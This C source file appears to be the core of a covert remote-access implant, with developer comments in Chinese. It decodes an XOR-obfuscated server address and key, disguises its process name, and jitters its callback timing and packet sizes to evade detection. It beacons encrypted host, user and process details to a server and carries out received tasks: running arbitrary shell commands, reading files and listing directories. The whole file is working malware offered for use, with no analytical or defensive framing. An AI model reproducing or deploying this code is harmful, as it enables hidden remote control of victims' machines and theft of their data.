/* Portable core: config decode, TLV protocol, task loop. */
#include "port.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(__BYTE_ORDER__) && __BYTE_ORDER__ != __ORDER_LITTLE_ENDIAN__
#error "this build only targets little-endian"
#endif

#define TLV_ID        0x01
#define TLV_TS        0x02
#define TLV_PAD       0x0f
#define TLV_HOST      0x10
#define TLV_OS        0x11
#define TLV_ARCH      0x12
#define TLV_USER      0x13
#define TLV_PID       0x14
#define TLV_EXEC_RES  0x20
#define TLV_FILE_RES  0x30
#define TLV_DIR_RES   0x31
#define TLV_EXEC_TASK 0x40
#define TLV_READ_TASK 0x41
#define TLV_SLEEP_TASK 0x42
#define TLV_EXIT_TASK 0x43
#define TLV_NEXT_HINT 0x44
#define TLV_LIST_TASK 0x45

static char g_url[512];
static char g_ua[192];
static char g_json_key[24];
static unsigned char g_key[32];
static char g_id[17];
static unsigned int g_interval;
static int g_exact; /* 1 = 干活：按 g_interval 整秒睡，不再乘浮动 */
static char *g_argv0;      /* 运行时伪装：ps -f 显示的是这块内存 */
static size_t g_argv0_len;

static void deob(const unsigned char *in, size_t n, char *out) {
    size_t i;
    for (i = 0; i < n; i++) out[i] = (char)(in[i] ^ CFG_XOR);
    out[n] = '\0';
}

/* Domain-separation salt for AEAD key derivation. Encoded so the plaintext
   does not sit in .rodata; decoded bytes must match server keyCtx. */
#define CTX_LEN 12
static void reveal_ctx(char *out) {
    static const unsigned char enc[CTX_LEN] = {
        0xc9, 0xcc, 0xd1, 0xc0, 0x8a, 0xc4, 0xc0, 0xc4, 0xc1, 0x8a, 0xd3, 0x94
    };
    volatile unsigned char xk = 0xa5;
    size_t i;
    for (i = 0; i < CTX_LEN; i++) out[i] = (char)(enc[i] ^ xk);
    out[CTX_LEN] = '\0';
}

/* ---- growable byte buffer ---- */
typedef struct {
    unsigned char *data;
    size_t len;
    size_t cap;
} buf_t;

static int buf_grow(buf_t *b, size_t need) {
    unsigned char *p;
    size_t ncap;
    /* 单块缓冲封顶，避免一条异常回包把宿主机内存吃光。 */
    if (need > (size_t)WIRE_MAX || b->len > (size_t)WIRE_MAX - need) return -1;
    if (b->len + need <= b->cap) return 0;
    ncap = b->cap ? b->cap : 256;
    while (ncap < b->len + need) {
        if (ncap > (size_t)WIRE_MAX / 2) {
            ncap = (size_t)WIRE_MAX;
            break;
        }
        ncap *= 2;
    }
    if (ncap < b->len + need) return -1;
    p = (unsigned char *)realloc(b->data, ncap);
    if (!p) return -1;
    b->data = p;
    b->cap = ncap;
    return 0;
}

static void buf_raw(buf_t *b, const void *value, size_t n) {
    if (buf_grow(b, n) != 0) exit(1);
    if (n) memcpy(b->data + b->len, value, n);
    b->len += n;
}

static void buf_tlv(buf_t *b, unsigned char type, const void *value, size_t n) {
    unsigned char lenb[2];
    if (n > 0xFFFF) return; /* 长度字段只有 16 位，超长直接丢掉，不能截断后错位 */
    lenb[0] = (unsigned char)(n & 0xff);
    lenb[1] = (unsigned char)((n >> 8) & 0xff);
    buf_raw(b, &type, 1);
    buf_raw(b, lenb, 2);
    buf_raw(b, value, n);
}

/* ---- base64 (standard alphabet, with padding) ---- */
static const char B64T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t b64_encode(const unsigned char *in, size_t n, char *out) {
    size_t i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        unsigned int v = ((unsigned int)in[i] << 16) | ((unsigned int)in[i + 1] << 8) | in[i + 2];
        out[o++] = B64T[(v >> 18) & 63];
        out[o++] = B64T[(v >> 12) & 63];
        out[o++] = B64T[(v >> 6) & 63];
        out[o++] = B64T[v & 63];
    }
    if (i < n) {
        unsigned int v = (unsigned int)in[i] << 16;
        int have = 1;
        if (i + 1 < n) { v |= (unsigned int)in[i + 1] << 8; have = 2; }
        out[o++] = B64T[(v >> 18) & 63];
        out[o++] = B64T[(v >> 12) & 63];
        out[o++] = have == 2 ? B64T[(v >> 6) & 63] : '=';
        out[o++] = '=';
    }
    out[o] = '\0';
    return o;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, size_t n, unsigned char *out, size_t *out_len) {
    size_t i, o = 0;
    unsigned int acc = 0;
    int bits = 0;
    for (i = 0; i < n; i++) {
        int v;
        if (in[i] == '=') break;
        v = b64_val(in[i]);
        if (v < 0) return -1;
        acc = (acc << 6) | (unsigned int)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (unsigned char)((acc >> bits) & 0xff);
        }
    }
    *out_len = o;
    return 0;
}

/* ---- JSON envelope: {"<key>":"<b64>"} ---- */
static int build_body(const buf_t *pt, char **body_out, size_t *body_len) {
    unsigned char nonce[12];
    unsigned char *ct, *sealed, tag[16];
    char *b64, *out;
    size_t sealed_len, b64_len, cap;

    if (pt->len == 0) return -1;
    ct = (unsigned char *)malloc(pt->len);
    if (!ct) return -1;
    rand_bytes(nonce, 12);
    if (aes_gcm_seal(g_key, nonce, pt->data, pt->len, ct, pt->len, tag) != 0) {
        free(ct);
        return -1;
    }
    sealed_len = 12 + pt->len + 16;
    sealed = (unsigned char *)malloc(sealed_len);
    b64 = (char *)malloc(((sealed_len + 2) / 3) * 4 + 1);
    if (!sealed || !b64) { free(ct); free(sealed); free(b64); return -1; }
    memcpy(sealed, nonce, 12);
    memcpy(sealed + 12, ct, pt->len);
    memcpy(sealed + 12 + pt->len, tag, 16);
    free(ct);
    b64_len = b64_encode(sealed, sealed_len, b64);
    free(sealed);

    cap = strlen(g_json_key) + b64_len + 16;
    out = (char *)malloc(cap);
    if (!out) { free(b64); return -1; }
    *body_len = (size_t)snprintf(out, cap, "{\"%s\":\"%s\"}", g_json_key, b64);
    free(b64);
    *body_out = out;
    return 0;
}

/* Server responses use the same single-field envelope; parse leniently. */
static int parse_envelope(const char *body, size_t body_len, buf_t *pt_out) {
    const char *colon, *q, *end;
    unsigned char *sealed, *plain;
    size_t b64n, sealed_len, plain_len;

    colon = (const char *)memchr(body, ':', body_len);
    if (!colon) return -1;
    q = (const char *)memchr(colon, '"', body_len - (size_t)(colon - body));
    if (!q) return -1;
    q++;
    end = (const char *)memchr(q, '"', body_len - (size_t)(q - body));
    if (!end) return -1;
    b64n = (size_t)(end - q);
    if (b64n == 0 || b64n > RESP_MAX_BODY) return -1;
    sealed = (unsigned char *)malloc((b64n / 4) * 3 + 3);
    if (!sealed) return -1;
    if (b64_decode(q, b64n, sealed, &sealed_len) != 0 || sealed_len < 28 || sealed_len > RESP_MAX_BODY) {
        free(sealed);
        return -1;
    }
    plain_len = sealed_len - 28;
    plain = (unsigned char *)malloc(plain_len ? plain_len : 1);
    if (!plain) { free(sealed); return -1; }
    if (aes_gcm_open(g_key, sealed, sealed + 12, plain_len, sealed + 12 + plain_len, plain, plain_len) != 0) {
        free(sealed);
        free(plain);
        return -1;
    }
    free(sealed);
    buf_raw(pt_out, plain, plain_len);
    free(plain);
    return 0;
}

/* ---- task execution ---- */
static void do_exec_task(uint32_t task_id, const char *cmd, int timeout_sec, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    int exit_code = -1;
    buf_t val = {0, 0, 0};
    int32_t ec32;

    if (exec_cmd(cmd, timeout_sec, &out, &out_len, &exit_code) != 0 && !out) {
        out = (unsigned char *)malloc(1);
        out_len = 0;
        exit_code = -1;
    }
    buf_raw(&val, &task_id, 4);
    ec32 = (int32_t)exit_code;
    buf_raw(&val, &ec32, 4);
    if (out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_EXEC_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

static void do_read_task(uint32_t task_id, const char *path, uint32_t offset, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    uint32_t total = 0;
    int err_code = 0;
    buf_t val = {0, 0, 0};
    unsigned char eb;

    read_file_chunk(path, offset, &out, &out_len, &total, &err_code);
    buf_raw(&val, &task_id, 4);
    eb = (unsigned char)err_code;
    buf_raw(&val, &eb, 1);
    buf_raw(&val, &offset, 4);
    buf_raw(&val, &total, 4);
    if (!err_code && out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_FILE_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

static void do_list_task(uint32_t task_id, const char *path, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    int err_code = 0, truncated = 0;
    unsigned char eb, tb;
    buf_t val = {0, 0, 0};

    list_dir(path && path[0] ? path : ".", &out, &out_len, &err_code, &truncated);
    buf_raw(&val, &task_id, 4);
    eb = (unsigned char)err_code;
    tb = (unsigned char)truncated;
    buf_raw(&val, &eb, 1);
    buf_raw(&val, &tb, 1);
    if (!err_code && out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_DIR_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

/* TLV strings are length-delimited, not NUL-terminated: copy + terminate. */
static char *tlv_str(const unsigned char *src, size_t n) {    char *s = (char *)malloc(n + 1);
    if (!s) return NULL;
    memcpy(s, src, n);
    s[n] = '\0';
    return s;
}

static void run_tasks(const buf_t *tasks, buf_t *results) {
    const unsigned char *p = tasks->data;
    size_t remain = tasks->len;
    int ran = 0;
    while (remain >= 3) {
        unsigned char type = p[0];
        size_t n = (size_t)p[1] | ((size_t)p[2] << 8);
        const unsigned char *v;
        if (remain < 3 + n) break;
        v = p + 3;
        switch (type) {
        case TLV_EXEC_TASK:
            if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
            if (n >= 6) {
                uint32_t task_id;
                int timeout_sec;
                char *cmd;
                memcpy(&task_id, v, 4);
                timeout_sec = (int)v[4] | ((int)v[5] << 8);
                cmd = tlv_str(v + 6, n - 6);
                if (cmd) {
                    do_exec_task(task_id, cmd, timeout_sec, results);
                    free(cmd);
                    ran++;
                }
            }
            break;
        case TLV_READ_TASK:
            if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
            if (n >= 4) {
                uint32_t task_id, offset = 0;
                size_t path_off = 4;
                char *path;
                memcpy(&task_id, v, 4);
                /* 新协议：[id:4][offset:4][path]。旧服务端没有 offset，按 0 读。 */
                if (n >= 8) {
                    memcpy(&offset, v + 4, 4);
                    path_off = 8;
                }
                path = tlv_str(v + path_off, n - path_off);
                if (path) {
                    do_read_task(task_id, path, offset, results);
                    free(path);
                    ran++;
                }
            }
            break;
        case TLV_LIST_TASK:
            if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
            if (n >= 4) {
                uint32_t task_id;
                char *path;
                memcpy(&task_id, v, 4);
                path = tlv_str(v + 4, n - 4);
                if (path) {
                    do_list_task(task_id, path, results);
                    free(path);
                    ran++;
                }
            }
            break;
        case TLV_SLEEP_TASK:
            if (n >= 5) {
                uint32_t iv;
                memcpy(&iv, v, 4);
                if (iv > 0) g_interval = iv;
            }
            break;
        case TLV_NEXT_HINT:
            /* 4 字节基准秒数，第 5 字节为 1 时本轮按整秒睡（干活）。 */
            if (n >= 4) {
                uint32_t iv;
                memcpy(&iv, v, 4);
                if (iv >= 5 && iv <= 86400) g_interval = iv;
                g_exact = (n >= 5 && v[4] == 1);
            }
            break;
        case TLV_EXIT_TASK:
            sys_shutdown();
            exit(0);
        default:
            break;
        }
        p += 3 + n;
        remain -= 3 + n;
    }
}

/* ---- rhythm ---- */
static double rand_uniform(double lo, double hi) {
    unsigned char b;
    rand_bytes(&b, 1);
    return lo + (hi - lo) * ((double)b / 255.0);
}

static double next_interval(void) {
    if (g_exact) return (double)g_interval;
    /* 空闲：每跳重新抽，倍率落在 [0.5, 3]。 */
    return (double)g_interval * rand_uniform(0.5, 3.0);
}

int main(int argc, char **argv) {
    char hostname[256] = {0}, username[256] = {0}, os[128] = {0}, arch[64] = {0};
    unsigned char secret[33]; /* 33: deob 在末尾补 NUL */
    unsigned char idhash[32];
    buf_t kctx = {0, 0, 0}, idb = {0, 0, 0}, results = {0, 0, 0};
    uint32_t pid = 0;
    double backoff = 1.0;
    size_t i;

    if (sys_init() != 0) return 1;
    /* config 与解码缓冲不匹配就拒绝运行，避免写爆栈上的固定数组。 */
    if (CFG_URL_LEN >= sizeof g_url || CFG_UA_LEN >= sizeof g_ua ||
        CFG_JSON_KEY_LEN >= sizeof g_json_key || CFG_KEY_LEN != 32) return 1;
    deob(CFG_URL, CFG_URL_LEN, g_url);
    deob(CFG_UA, CFG_UA_LEN, g_ua);
    deob(CFG_JSON_KEY, CFG_JSON_KEY_LEN, g_json_key);
    deob(CFG_KEY, (size_t)CFG_KEY_LEN, (char *)secret);
    g_interval = CFG_INTERVAL;
    if (g_interval == 0) g_interval = 180;

    if (argc > 0 && argv[0] != NULL) {
        g_argv0 = argv[0];
        g_argv0_len = strlen(argv[0]);
    }
#ifdef CFG_PNAME
    {
        char pname[CFG_PNAME_LEN + 1];
        size_t n;
        deob(CFG_PNAME, CFG_PNAME_LEN, pname);
        sys_set_procname(pname);
        /* 只能原地改写：argv 内存块后面紧跟环境区，不能越界。 */
        if (g_argv0) {
            n = strlen(pname);
            if (n > g_argv0_len) n = g_argv0_len;
            memcpy(g_argv0, pname, n);
            g_argv0[n] = '\0';
        }
        memset(pname, 0, sizeof pname);
    }
#endif

    {
        char ctx[CTX_LEN + 1];
        reveal_ctx(ctx);
        buf_raw(&kctx, secret, 32);
        buf_raw(&kctx, ctx, CTX_LEN);
        memset(ctx, 0, sizeof ctx);
    }
    if (sha256(kctx.data, kctx.len, g_key) != 0) return 1;
    free(kctx.data);

    host_info(hostname, sizeof hostname, username, sizeof username, os, sizeof os, arch, sizeof arch, &pid);
    buf_raw(&idb, secret, 32);
    buf_raw(&idb, hostname, strlen(hostname));
    buf_raw(&idb, username, strlen(username));
    if (sha256(idb.data, idb.len, idhash) != 0) return 1;
    free(idb.data);
    for (i = 0; i < 8; i++) sprintf(g_id + i * 2, "%02x", idhash[i]);
    memset(secret, 0, sizeof secret);
    memset(idhash, 0, sizeof idhash);

    sleep_sec(rand_uniform(5.0, 30.0)); /* sever the deploy->callback link */

    for (;;) {
        buf_t pt = {0, 0, 0}, tasks = {0, 0, 0};
        char *body = NULL, *resp = NULL;
        size_t body_len = 0, resp_len = 0;
        long status = 0;
        unsigned char ts8[8], pad[256];
        uint64_t now = now_unix();

        memcpy(ts8, &now, 8);
        buf_tlv(&pt, TLV_ID, g_id, strlen(g_id));
        buf_tlv(&pt, TLV_TS, ts8, 8);
        /* 每次都带主机信息：服务端重启后内存记录会丢，只在首包里带会变成一台没有名字的信标。 */
        buf_tlv(&pt, TLV_HOST, hostname, strlen(hostname));
        buf_tlv(&pt, TLV_OS, os, strlen(os));
        buf_tlv(&pt, TLV_ARCH, arch, strlen(arch));
        buf_tlv(&pt, TLV_USER, username, strlen(username));
        buf_tlv(&pt, TLV_PID, &pid, 4);
        if (results.len) buf_raw(&pt, results.data, results.len);
        rand_bytes(pad, sizeof pad);
        buf_tlv(&pt, TLV_PAD, pad, (size_t)(1 + pad[0])); /* 1..256B size jitter */

        if (build_body(&pt, &body, &body_len) != 0) {
            free(pt.data);
            sleep_sec(backoff);
            backoff = backoff * 2 > (double)g_interval ? (double)g_interval : backoff * 2;
            continue;
        }
        free(pt.data);

        if (http_post(g_url, g_ua, body, body_len, &status, &resp, &resp_len) != 0 || status != 200) {
            free(body);
            free(resp);
            sleep_sec(backoff);
            backoff = backoff * 2 > (double)g_interval ? (double)g_interval : backoff * 2;
            continue;
        }
        free(body);
        backoff = 1.0;
        /* 服务端已经收下结果。把缓冲还回去，不要按历史最大输出一直占着。 */
        results.len = 0;
        free(results.data);
        results.data = NULL;
        results.cap = 0;

        if (parse_envelope(resp, resp_len, &tasks) == 0) {
            run_tasks(&tasks, &results);
            free(tasks.data);
        }
        free(resp);

        if (results.len) {
            sleep_sec(rand_uniform(1.0, 4.0)); /* decouple task->result timing */
            continue;
        }
        sleep_sec(next_interval());
    }
}
